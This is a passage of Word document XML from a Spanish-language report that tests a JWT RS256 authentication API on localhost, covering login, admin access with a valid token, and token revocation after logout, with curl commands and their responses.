          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&gt; Prueba 1 – Login seguro exitoso</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9360"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FF500C" w:rsidRPr="00AB6745" w14:paraId="154759B7" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9360" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0C0C0C"/>
          </w:tcPr>
          <w:p w14:paraId="5E6F1CC2" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="67AF38AF" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>curl -X POST "http://127.0.0.1:8001/login" \</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="481E753B" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">     -H "Content-Type: application/json" \</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5384223D" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">     -d '{"email":"admin@example.com","password":"adminpass"}'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F2254C8" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="331B2F3C" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>{</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="34EFDB94" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "access_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbkBleGFtcGxlLmNvbSIsInJvbGU..."</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70C77AE1" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2FC1F9D5" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F9A3007" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Nota: el token RS256 es considerablemente más largo que HS256</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1931599B" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>y contiene: sub, role, exp, iat, iss, aud  (más claims de seguridad)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6D49831D" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3837F43C" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Prueba 2 – Acceso al panel admin con token válido</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55A16FA5" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">  &gt; Prueba 2 – Acceso /admin con token válido</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9360"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FF500C" w:rsidRPr="00AB6745" w14:paraId="64134236" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9360" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0C0C0C"/>
          </w:tcPr>
          <w:p w14:paraId="2D450295" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="4B80C859" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>curl -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbkBleGF..." \</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2692DD58" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">     http://127.0.0.1:8001/admin</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B4238BB" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66874DE0" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>{"msg": "Acceso seguro - solo administradores"}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6FC37299" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38104AD3" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>HTTP 200 OK  ← acceso permitido correctamente</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="51E00F59" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BB99B3B" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Prueba 3 – Logout y revocación del token</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A84EE5E" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">  &gt; Prueba 3 – Logout y verificación de revocación</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9360"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FF500C" w:rsidRPr="00AB6745" w14:paraId="7C8D13AB" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9360" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0C0C0C"/>
          </w:tcPr>
          <w:p w14:paraId="18B94E03" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="17F295F8" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>curl -X POST -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbkBleGF..." \</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50700C81" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">     http://127.0.0.1:8001/logout</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="759CA0A7" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14CC272C" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>{"msg": "logout exitoso"}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77078A3D" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="774F3C65" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t># Intento de reusar el token después del logout:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35CCE0CF" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>curl -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbkBleGF..." \</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FD93141" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">     </w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>http://127.0.0.1:8001/admin</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A434C1A" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22CB51D8" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>HTTP 401 Unauthorized</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D0FA17C" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>{"detail": "Token revocado"}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0BB2FFF8" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D12928D" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>✓</w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve"> CORRECTO – el token quedó en la blacklist y fue rechazado</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4B388F6A" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53E2BEEE" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
